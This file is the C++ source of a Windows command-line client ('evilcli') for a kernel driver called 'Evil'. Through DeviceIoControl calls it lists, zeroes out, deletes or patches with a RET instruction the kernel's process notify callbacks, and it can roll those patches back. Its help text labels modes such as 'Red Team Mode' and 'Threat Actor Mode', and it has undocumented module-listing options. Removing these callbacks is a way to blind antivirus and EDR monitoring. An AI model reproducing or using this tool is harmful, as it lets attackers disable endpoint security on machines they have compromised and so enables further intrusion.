#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include "..\evil\Common.h"

int Error(const char* message) {
	printf("%s (error=%d)\n", message, GetLastError());
	return 1;
}

void Usage()
{
	printf("Usage: evilcli.exe <options>\n");
	printf("Options:\n");
	printf("  -h\t\tShow this message.\n");
	printf("  -l\t\tProcess Notify Callbacks Address's List.\n");
	printf("  -z\t\tZero out Process Notify Callback's Array (Cowboy Mode).\n");
	printf("  -d <index>\tDelete Specific Process Notify Callback (Red Team Mode).\n");
	printf("  -p <index>\tPatch Specific Process Notify Callback (Threat Actor Mode).\n");
	printf("  -r <index>\tRollback to the original Process Notify Callback (Thoughtful Ninja Mode).\n");
}

void DisplayInfo(BYTE* buffer, DWORD size) {
	auto count = size;
	while (count > 0)
	{
		auto index = *(ULONG64*)buffer;
		buffer += 8;
		auto addr = *(ULONG64*)buffer;
		buffer += 8;

		printf("[%02llu] 0x%llx", index, addr);

		count -= 16;

		auto ModuleName = (CHAR*)buffer;
		buffer += 32;
		auto ModuleBase = *(ULONG64*)buffer;
		buffer += 8;

		printf(" (%s + 0x%llx)\n", ModuleName, ModuleBase);

		count = count - 8 - 32;
	}
}

int main(int argc, const char* argv[]) {
	if (argc < 2) {
		Usage();
		return 0;
	}

	HANDLE hDevice = CreateFile(L"\\\\.\\Evil", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE)
		return Error("[-] Failed to open device");

	DWORD lpBytesReturned;
	ULONG64 OutputBuffer = 0;
	BOOL success = 0;
	EvilData InputBuffer;
	InputBuffer.list = 0;
	InputBuffer.remove = 0;
	InputBuffer.index = 65;

	if (strcmp(argv[1], "-z") == 0)
	{
		InputBuffer.remove = 1;
		success = DeviceIoControl(hDevice, IOCTL_EVIL_ZEROOUT_ARRAY, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
	}
	else if (strcmp(argv[1], "-m") == 0) // not in the help menu
	{
		success = DeviceIoControl(hDevice, IOCTL_EVIL_LIST_MODULES, nullptr, 0, &OutputBuffer, 0, &lpBytesReturned, nullptr);
	}
	else if (strcmp(argv[1], "-b") == 0) // not in the help menu
	{
		success = DeviceIoControl(hDevice, IOCTL_EVIL_LIST_MODULES, nullptr, 0, &OutputBuffer, 0, &lpBytesReturned, nullptr);
	}
	else if (strcmp(argv[1], "-p") == 0)
	{
		InputBuffer.index = atoi(argv[2]);
		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
		{
			printf("Patching index: %d with a RET (0xc3)\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_EVIL_CALLBACK_RET, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
		}
		else
			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
	}
	else if (strcmp(argv[1], "-r") == 0)
	{
		InputBuffer.index = atoi(argv[2]);
		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
		{
			printf("Rolling back patched index: %d to the original values\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_EVIL_ROLLBACK_RET, &InputBuffer, sizeof(InputBuffer), nullptr, 0, &lpBytesReturned, nullptr);
		}
		else
			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
	}
	else if (strcmp(argv[1], "-d") == 0)
	{
		InputBuffer.index = atoi(argv[2]);
		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
		{
			printf("Removing index: %d\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_EVIL_DELETE_CALLBACK, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
		}
		else
			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
	}
	else if (strcmp(argv[1], "-l") == 0)
	{
		int count = 0;
		auto hFile = ::CreateFile(L"\\\\.\\Evil", GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
		if (hFile == INVALID_HANDLE_VALUE)
			return Error("Failed to open file");

		BYTE buffer[1 << 16];
		::memset(buffer, 0, sizeof(buffer));

		while (true)
		{
			DWORD bytes;

			if (!::ReadFile(hFile, buffer, sizeof(buffer), &bytes, nullptr))
				return Error("Failed to read");

			if (bytes != 0)
			{
				DisplayInfo(buffer, bytes);
				success = 1;
				break;
			}

			if (count == 65)
			{
				success = 1;
				break;
			}
			else
				count++;
		}
	}
	else
	{
		Usage();
		return 0;
	}

	if (!success)
		Error("[-] IOCTL failed!");

	CloseHandle(hDevice);

	return 0;
}
